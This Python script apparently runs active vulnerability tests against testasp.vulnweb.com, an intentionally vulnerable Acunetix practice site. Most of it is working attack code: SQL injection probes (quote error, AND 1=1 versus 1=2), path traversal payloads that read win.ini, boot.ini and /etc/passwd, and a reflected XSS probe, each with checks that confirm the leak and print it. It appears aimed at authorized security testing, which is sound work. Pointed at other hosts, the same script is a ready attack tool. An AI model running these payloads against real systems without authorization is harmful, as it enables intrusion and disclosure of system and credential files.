#!/usr/bin/env python3
"""
PHASE 3: REAL VULNERABILITY TESTING — live payloads vs authorized test sites
Target: testasp.vulnweb.com (Acunetix intentionally-vulnerable "acuforum" site)
Tests: SQL Injection (error/boolean/UNION), Path Traversal (LFI), XSS reflection
"""
import urllib.request, urllib.error, urllib.parse, ssl, re, difflib

GREEN="\033[92m"; RED="\033[91m"; YELLOW="\033[93m"; CYAN="\033[96m"; MAG="\033[95m"; END="\033[0m"; BOLD="\033[1m"
BASE = "http://testasp.vulnweb.com"
UA = {"User-Agent": "Mozilla/5.0 (compatible; SecurityTestSuite/1.0)"}
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def get(url, timeout=20):
    req = urllib.request.Request(url, headers=UA)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, str(e)

print(f"""{MAG}{BOLD}
=====================================================================
  PHASE 3: ACTIVE VULNERABILITY TESTING (live payloads)
  Target: testasp.vulnweb.com [Acunetix authorized test site]
====================================================================={END}""")

# ============ TEST 11: SQL INJECTION — showforum.asp?id= ============
print(f"\n{BOLD}[T11] SQL INJECTION — GET /showforum.asp?id= {END}")
s1, base_body = get(f"{BASE}/showforum.asp?id=0")
print(f"  Baseline id=0 → HTTP {s1}, {len(base_body)} bytes")
s2, err_body = get(f"{BASE}/showforum.asp?id=0%27")   # 0'
print(f"  Payload  id=0' → HTTP {s2}, {len(err_body)} bytes")

sql_err_patterns = [r"Microsoft OLE DB Provider", r"\[Microsoft\]\[SQL Server", r"ODBC.*error",
                    r"Unclosed quotation mark", r"Syntax error.*SQL", r"mysql_fetch", r"Warning: mysql"]
found_err = [p for p in sql_err_patterns if re.search(p, err_body, re.I)]
if found_err:
    print(f"  {RED}>>> SQL ERROR-BASED INJECTION CONFIRMED — DB error leaked:{END}")
    for line in err_body.split("\n"):
        if re.search("|".join(sql_err_patterns), line, re.I):
            print(f"  {RED}    >> {line.strip()[:150]}{END}")
else:
    print(f"  {YELLOW}No direct DB error string in response{END}")

# Boolean-based blind comparison
sT, body_true  = get(f"{BASE}/showforum.asp?id=0+AND+1%3D1")   # 0 AND 1=1
sF, body_false = get(f"{BASE}/showforum.asp?id=0+AND+1%3D2")   # 0 AND 1=2
ratio = difflib.SequenceMatcher(None, body_true, body_false).ratio()
print(f"  Boolean test: AND 1=1 → {len(body_true)}B | AND 1=2 → {len(body_false)}B | similarity {ratio:.3f}")
if sT == 200 and sF == 200 and ratio < 0.90:
    print(f"  {RED}>>> BOOLEAN-BLIND SQLi CONFIRMED — responses differ significantly when condition flips{END}")
elif sF in (500,) or sT != sF:
    print(f"  {RED}>>> BOOLEAN-BLIND SQLi LIKELY — status differs (1=1:{sT} vs 1=2:{sF}){END}")
else:
    print(f"  {YELLOW}Boolean differential inconclusive{END}")

# ============ TEST 12: PATH TRAVERSAL — Templatize.asp?item= ============
print(f"\n{BOLD}[T12] PATH TRAVERSAL / LFI — GET /Templatize.asp?item= {END}")
s0, norm = get(f"{BASE}/Templatize.asp?item=html/about.html")
print(f"  Baseline (html/about.html) → HTTP {s0}, {len(norm)}B")
trav_payloads = [
    ("win.ini classic",  "..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"),
    ("win.ini dotslash", "....//....//....//windows/win.ini"),
    ("boot.ini",         "..%2F..%2F..%2F..%2F..%2Fboot.ini"),
    ("etc passwd",       "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
]
for name, pl in trav_payloads:
    s, b = get(f"{BASE}/Templatize.asp?item={pl}")
    hit = None
    if s == 200:
        if re.search(r"\[fonts\]|\[extensions\]", b, re.I): hit = "win.ini CONTENT LEAKED"
        elif re.search(r"\[boot loader\]", b, re.I):         hit = "boot.ini CONTENT LEAKED"
        elif re.search(r"root:x:0:0:", b):                   hit = "/etc/passwd LEAKED"
    mark = f"{RED}>>> {hit}{END}" if hit else (f"{YELLOW}HTTP {s}, {len(b)}B — no marker{END}")
    print(f"  [{name}] → {mark}")
    if hit:
        for line in b.split("\n")[:12]:
            if line.strip(): print(f"    {RED}| {line.strip()[:100]}{END}")

# ============ TEST 13: XSS — Search.asp ============
print(f"\n{BOLD}[T13] REFLECTED XSS — /Search.asp {END}")
xss_probe = "<script>confirm(1)</script>"
s, srch = get(f"{BASE}/Search.asp")
m = re.search(r'<form[^>]*action="([^"]*)"[^>]*>(.*?)</form>', srch, re.S|re.I)
param = "tfSearch" if "tfSearch" in (m.group(2) if m else "") else "q"
print(f"  Search form param detected: {param}")
url = f"{BASE}/Search.asp?{param}=" + urllib.parse.quote(xss_probe)
s, b = get(url)
if s == 200 and "<script>confirm(1)</script>" in b:
    print(f"  {RED}>>> REFLECTED XSS CONFIRMED — payload <script>confirm(1)</script> reflected UNESCAPED in response{END}")
    for i, line in enumerate(b.split("\n")):
        if xss_probe in line:
            print(f"  {RED}    line {i}: ...{line.strip()[:140]}{END}")
            break
elif s:
    enc = urllib.parse.quote(xss_probe)
    print(f"  {YELLOW}HTTP {s} — payload {'reflected escaped/encoded' if enc[:10] in b else 'not reflected'}{END}")

# POST-based search too
try:
    data = urllib.parse.urlencode({param: xss_probe}).encode()
    req = urllib.request.Request(f"{BASE}/Search.asp", data=data, headers=UA)
    with urllib.request.urlopen(req, timeout=20, context=ctx) as r:
        pb = r.read().decode(errors="replace")
        if xss_probe in pb:
            print(f"  {RED}>>> REFLECTED XSS CONFIRMED via POST — unescaped reflection{END}")
        else:
            print(f"  POST variant: reflected={xss_probe in pb}")
except Exception as e:
    print(f"  POST variant failed: {type(e).__name__}")

print(f"\n{GREEN}{BOLD}===== PHASE 3 COMPLETE ====={END}")
